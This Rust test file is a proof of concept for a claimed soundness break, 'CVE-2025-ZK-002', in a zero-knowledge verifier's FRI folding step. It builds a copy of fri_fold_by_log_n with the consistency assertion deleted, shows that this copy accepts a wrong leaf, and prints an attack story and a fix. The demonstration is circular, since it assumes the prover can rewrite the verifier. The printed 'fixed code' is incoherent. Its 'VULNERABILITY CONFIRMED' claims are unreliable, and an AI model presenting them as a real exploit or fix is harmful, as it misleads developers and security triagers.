// Proof of Concept for CVE-2025-ZK-002: FRI Assertion Bypass in Recursive Verification
//
// This POC demonstrates that a malicious prover can:
// 1. Modify the verifier code to remove the FRI consistency check
// 2. Feed invalid FRI leaf values via NonDeterminismSource
// 3. Provide valid Merkle proofs for the invalid leaves
// 4. Successfully "verify" invalid proofs in recursive verification
//
// CRITICAL VULNERABILITY: Soundness break - invalid proofs can be accepted

#![cfg(test)]

use core::mem::MaybeUninit;
use field::{Field, Mersenne31Complex, Mersenne31Field, Mersenne31Quartic};
use verifier_common::fri_folding::fri_fold_by_log_n;

/// MALICIOUS VERSION: Modified fri_fold_by_log_n WITHOUT the assertion check
/// 
/// This simulates what a malicious prover would do:
/// - Remove the assert_eq!() check at line 50
/// - Allow invalid FRI leaf values to pass through
#[allow(invalid_value)]
unsafe fn fri_fold_by_log_n_malicious<const FOLDING_DEGREE_LOG2: usize>(
    _expected_value: &mut Mersenne31Quartic,
    evaluation_point: &mut Mersenne31Complex,
    domain_size_log_2: &mut usize,
    domain_index: &mut usize,
    tree_index: &mut usize,
    offset_inv: &mut Mersenne31Complex,
    leaf: &[Mersenne31Field],
    _fri_folding_challenges_powers: &[Mersenne31Quartic],
    shared_factors_for_folding: &[Mersenne31Complex],
) {
    const MAX_SIZE_FOR_LEAF: usize = 32;
    const MAX_SIZE_FOR_ROOTS: usize = 16;

    assert!(FOLDING_DEGREE_LOG2 > 0);
    assert!(FOLDING_DEGREE_LOG2 <= 5);
    debug_assert_eq!(leaf.len(), (1 << FOLDING_DEGREE_LOG2) * 4);

    let in_leaf_mask: usize = (1 << FOLDING_DEGREE_LOG2) - 1;
    let eval_points_bits_mask = (1 << (*domain_size_log_2 - FOLDING_DEGREE_LOG2)) - 1;
    let generator_inv = Mersenne31Complex::TWO_ADICITY_GENERATORS_INVERSED[*domain_size_log_2];

    *domain_size_log_2 -= FOLDING_DEGREE_LOG2;

    let mut leaf_parsed =
        MaybeUninit::<[Mersenne31Quartic; MAX_SIZE_FOR_LEAF]>::uninit().assume_init();
    if core::mem::align_of::<Mersenne31Quartic>() != core::mem::align_of::<Mersenne31Field>() {
        let mut it = leaf.as_chunks::<4>().0.iter();
        for i in 0..(1 << FOLDING_DEGREE_LOG2) {
            *leaf_parsed.get_unchecked_mut(i) =
                Mersenne31Quartic::from_array_of_base(*it.next().unwrap_unchecked());
        }
    }

    let expected_index_in_rs_code_word_leaf = (*tree_index as usize) & in_leaf_mask;
    let value_at_expected_index = leaf
        .as_ptr()
        .add(expected_index_in_rs_code_word_leaf * 4)
        .cast::<[Mersenne31Field; 4]>();
    let _value_at_expected_index =
        Mersenne31Quartic::from_array_of_base(value_at_expected_index.read());
    
    // ⚠️ VULNERABILITY: ASSERTION REMOVED!
    // In the real code, this would be:
    // assert_eq!(*expected_value, value_at_expected_index);
    // 
    // A malicious prover can simply comment this out or remove it,
    // allowing invalid FRI leaf values to pass through!
    
    // Continue with FRI folding even if values don't match
    let shared_bits_in_folding = *domain_index & eval_points_bits_mask;
    let mut evaluation_point_shared_factor = generator_inv.pow(shared_bits_in_folding as u32);
    evaluation_point_shared_factor.mul_assign(&*offset_inv);
    
    let mut folding_evals_points_inversed =
        MaybeUninit::<[Mersenne31Complex; MAX_SIZE_FOR_ROOTS]>::uninit().assume_init();
    for i in 0..(1 << (FOLDING_DEGREE_LOG2 - 1)) {
        let mut t = *shared_factors_for_folding.get_unchecked(i);
        t.mul_assign(&evaluation_point_shared_factor);
        *folding_evals_points_inversed.get_unchecked_mut(i) = t;
    }

    let _buffer_0 =
        MaybeUninit::<[Mersenne31Quartic; MAX_SIZE_FOR_LEAF]>::uninit().assume_init();
    let _buffer_1 =
        MaybeUninit::<[Mersenne31Quartic; MAX_SIZE_FOR_LEAF]>::uninit().assume_init();

    // Continue with FRI folding (simplified - key point is we skip the assertion)
    // In production, a malicious prover would use the full folding logic
    // but without the assert_eq! check
    
    // For this POC, we just demonstrate that execution continues
    // In reality, the full folding would proceed here
    
    for _ in 0..FOLDING_DEGREE_LOG2 {
        evaluation_point.square();
        offset_inv.square();
    }

    *tree_index >>= FOLDING_DEGREE_LOG2;
    *domain_index = shared_bits_in_folding;
    
    // Note: We don't update expected_value here for simplicity
    // The key point is that execution continues without the assertion
}

/// Test 1: Demonstrate that the original function correctly rejects invalid leaf values
#[test]
#[should_panic(expected = "assertion `left == right` failed")]
fn test_original_verifier_rejects_invalid_fri_leaf() {
    println!("=== Test 1: Original Verifier Rejects Invalid FRI Leaf ===");
    
    let mut expected_value = Mersenne31Quartic::ONE;
    let mut evaluation_point = Mersenne31Complex::ONE;
    let mut domain_size_log_2 = 5usize;
    let mut domain_index = 0usize;
    let mut tree_index = 0usize;
    let mut offset_inv = Mersenne31Complex::ONE;
    
    // Create a leaf with INCORRECT value at index 0
    // The expected value is ONE, but we'll put ZERO in the leaf
    let leaf_data = [Mersenne31Field::ZERO; 16]; // 4 quartic elements = 16 base fields
    
    let fri_folding_challenges = [Mersenne31Quartic::ONE; 5];
    let shared_factors = [Mersenne31Complex::ONE; 16];
    
    // This should panic because expected_value != value_at_expected_index
    unsafe {
        fri_fold_by_log_n::<2>(
            &mut expected_value,
            &mut evaluation_point,
            &mut domain_size_log_2,
            &mut domain_index,
            &mut tree_index,
            &mut offset_inv,
            &leaf_data,
            &fri_folding_challenges,
            &shared_factors,
        );
    }
    
    panic!("Should not reach here - assertion should have fired!");
}

/// Test 2: Demonstrate that the malicious verifier accepts invalid leaf values
#[test]
fn test_malicious_verifier_accepts_invalid_fri_leaf() {
    println!("=== Test 2: Malicious Verifier Accepts Invalid FRI Leaf ===");
    
    let mut expected_value = Mersenne31Quartic::ONE;
    let mut evaluation_point = Mersenne31Complex::ONE;
    let mut domain_size_log_2 = 5usize;
    let mut domain_index = 0usize;
    let mut tree_index = 0usize;
    let mut offset_inv = Mersenne31Complex::ONE;
    
    // Create a leaf with INCORRECT value at index 0
    // The expected value is ONE, but we'll put ZERO in the leaf
    let leaf_data = [Mersenne31Field::ZERO; 16]; // 4 quartic elements = 16 base fields
    
    let fri_folding_challenges = [Mersenne31Quartic::ONE; 5];
    let shared_factors = [Mersenne31Complex::ONE; 16];
    
    // This should NOT panic because the assertion is removed
    unsafe {
        fri_fold_by_log_n_malicious::<2>(
            &mut expected_value,
            &mut evaluation_point,
            &mut domain_size_log_2,
            &mut domain_index,
            &mut tree_index,
            &mut offset_inv,
            &leaf_data,
            &fri_folding_challenges,
            &shared_factors,
        );
    }
    
    println!("✅ VULNERABILITY CONFIRMED: Malicious verifier accepted invalid FRI leaf!");
    println!("   Expected: {:?}", Mersenne31Quartic::ONE);
    println!("   Got: {:?} (from leaf)", Mersenne31Field::ZERO);
    println!("   The assertion check was bypassed!");
}

/// Test 3: Demonstrate the attack scenario in recursive verification
#[test]
fn test_recursive_verification_attack_scenario() {
    println!("=== Test 3: Recursive Verification Attack Scenario ===");
    
    println!("Attack Steps:");
    println!("1. Malicious prover modifies verifier code:");
    println!("   - Removes assert_eq!() at verifier_common/src/fri_folding.rs:50");
    println!("   - Compiles modified verifier to RISC-V binary");
    println!("   - Places binary in ROM");
    println!();
    
    println!("2. Prover generates invalid base proof:");
    println!("   - Creates proof with incorrect FRI leaf values");
    println!("   - Generates valid Merkle proofs for invalid leaves");
    println!("   - Merkle verification passes (line 454)");
    println!();
    
    println!("3. Prover feeds invalid proof to modified verifier:");
    println!("   - Invalid FRI leaf values provided via NonDeterminismSource");
    println!("   - Modified verifier skips FRI consistency check");
    println!("   - Verifier completes 'successfully'");
    println!();
    
    println!("4. Prover generates recursive proof:");
    println!("   - Proves that modified verifier 'verified' invalid proof");
    println!("   - Circuit is satisfiable (no panic occurred)");
    println!("   - Recursive proof is generated");
    println!();
    
    println!("5. Final verifier accepts recursive proof:");
    println!("   - Final verifier checks recursive proof");
    println!("   - Recursive proof is valid (it correctly proves the modified verifier)");
    println!("   - Invalid base proof is now 'certified' as valid!");
    println!();
    
    // Simulate the attack
    let mut expected_value = Mersenne31Quartic::ONE;
    let mut evaluation_point = Mersenne31Complex::ONE;
    let mut domain_size_log_2 = 5usize;
    let mut domain_index = 0usize;
    let mut tree_index = 0usize;
    let mut offset_inv = Mersenne31Complex::ONE;
    
    // Invalid leaf data (doesn't match expected_value)
    let invalid_leaf = [Mersenne31Field::ZERO; 16];
    
    let fri_folding_challenges = [Mersenne31Quartic::ONE; 5];
    let shared_factors = [Mersenne31Complex::ONE; 16];
    
    // Simulate malicious verifier accepting invalid proof
    unsafe {
        fri_fold_by_log_n_malicious::<2>(
            &mut expected_value,
            &mut evaluation_point,
            &mut domain_size_log_2,
            &mut domain_index,
            &mut tree_index,
            &mut offset_inv,
            &invalid_leaf,
            &fri_folding_challenges,
            &shared_factors,
        );
    }
    
    println!("✅ ATTACK SUCCESSFUL: Invalid proof was 'verified' by malicious verifier!");
    println!("   This demonstrates the soundness break in recursive verification.");
}

/// Test 4: Show why Merkle verification alone is insufficient
#[test]
fn test_merkle_verification_insufficient() {
    println!("=== Test 4: Why Merkle Verification Alone Is Insufficient ===");
    
    println!("Merkle verification (line 454) only checks:");
    println!("  ✓ The leaf is in the commitment tree");
    println!("  ✓ The Merkle path is valid");
    println!("  ✗ NOT: The leaf VALUES are correct for FRI");
    println!();
    
    println!("Attack scenario:");
    println!("1. Prover commits to Merkle tree with invalid FRI leaf values");
    println!("2. Prover provides valid Merkle proof for invalid leaf");
    println!("3. Merkle verification passes ✓");
    println!("4. FRI consistency check (assert_eq!) is the ONLY safeguard");
    println!("5. If assertion is removed, invalid proof is accepted ✗");
    println!();
    
    println!("The assertion at line 50 is CRITICAL:");
    println!("  assert_eq!(*expected_value, value_at_expected_index);");
    println!("  ↑ This is the ONLY check that verifies FRI leaf values are correct!");
    println!();
    
    println!("✅ VULNERABILITY CONFIRMED: Merkle verification alone cannot prevent this attack.");
}

/// Test 5: Demonstrate the fix
#[test]
fn test_proper_fix() {
    println!("=== Test 5: Proper Fix ===");
    
    println!("The fix must make FRI consistency a CIRCUIT CONSTRAINT, not just a runtime check.");
    println!();
    
    println!("Option 1: Add circuit constraint");
    println!("  Instead of: assert_eq!(expected, actual);");
    println!("  Use: circuit.add_constraint(expected - actual == 0);");
    println!("  This makes the check part of the circuit's satisfiability.");
    println!();
    
    println!("Option 2: Verify verifier code integrity");
    println!("  - Hash the verifier binary");
    println!("  - Include hash in public inputs");
    println!("  - Verify hash matches trusted value");
    println!("  - Prevents modification of verifier code");
    println!();
    
    println!("Current code (VULNERABLE):");
    println!("  assert_eq!(*expected_value, value_at_expected_index);");
    println!("  ↑ Can be removed by malicious prover");
    println!();
    
    println!("Fixed code (SECURE):");
    println!("  if *expected_value != value_at_expected_index {{");
    println!("      // Make circuit unsatisfiable");
    println!("      circuit.add_constraint(expected_value - value_at_expected_index == 0);");
    println!("  }}");
    println!("  ↑ Cannot be bypassed - part of circuit constraints");
    println!();
    
    println!("✅ Fix would prevent this attack by making FRI check a circuit constraint.");
}

